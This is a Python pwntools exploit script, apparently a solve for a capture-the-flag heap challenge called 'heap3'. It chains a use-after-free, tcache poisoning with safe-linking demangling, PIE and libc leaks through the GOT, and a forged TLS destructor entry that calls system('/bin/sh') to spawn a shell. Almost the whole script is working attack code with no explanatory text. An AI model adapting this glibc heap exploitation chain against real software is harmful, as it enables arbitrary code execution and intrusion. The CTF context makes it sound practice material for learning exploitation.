#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './heap3_patched', checksec = False)

context.log_level = 'warning'

libc = ELF("./libc.so.6", checksec=False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    if args.REMOTE:
        return remote("localhost", 5252)
        #return remote("challenges2.perfectroot.wiki", 8002)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

def logleak(name, addr): print(f"[*] %s => %#lx" % (name, addr))

def itb(n: int): return str(n).encode()

def malloc(name: bytes):
    io.sendlineafter(b'ce: ', b'1')
    io.send(name)
    res = io.recvline()
    assert b'added' in res
    return int(res.strip().split(b'index ')[1])

def edit(idx: int, name: bytes): 
    io.sendlineafter(b'ce: ', b'3')
    io.sendlineafter(b't: ', itb(idx))
    io.send(name)

def free(idx: int):
    io.sendline(b'2')
    io.sendline(itb(idx))

def show(idx: int): 
    io.sendline(b'4')
    io.sendline(itb(idx))

def mangle(key, addr): return (key >> 12) ^ addr


a = malloc(b'idx0\n')
b = malloc(b'idx1\n') # reader & writer
c = malloc(b'cons\n')

free(a)
free(b)


# leaks
show(a)
io.recvuntil(b'Notification: ')
heap_key = u64(io.recvline().strip().ljust(8, b'\x00')) << 12
logleak('heap_key', heap_key)


edit(b, flat(mangle(heap_key, heap_key + 0x350)) + b'\n')

d = malloc(b'whatever\n')
overwrite = malloc(flat(heap_key+0x360) + b'\n')

show(b)


io.recvuntil(b'Notification: ')
pie_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
exe.address = pie_leak - exe.sym.default_notify
logleak('piebase', exe.address)

edit(overwrite, flat(exe.got.printf) + b'\n')

show(b)
io.recvuntil(b'Notification: ')
printf = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = printf - libc.sym.printf
logleak('glibc base', libc.address)

tls = libc.address - 0x28c0 - 0x740
tls_target = tls + 0x6e8
tls_mangle_addr = tls + 0x770

logleak('tls base', tls)
logleak('tls target', tls_target)
logleak('tls mangle cookie addr', tls_mangle_addr)

## write @ tls_target the address of our fake tls destructor (heap_key + 0x2c0)
fake_struct = flat(
    libc.sym.system << 0x11,
    next(libc.search(b"/bin/sh\x00"))
    )


edit(0, fake_struct + b'\n')


edit(overwrite, flat(tls_mangle_addr) + b'\n')
edit(b, flat(0x0) + b'\n')

edit(overwrite, flat(tls_target) + b'\n')
edit(b, flat(heap_key + 0x2c0) + b'\n')



io.interactive()

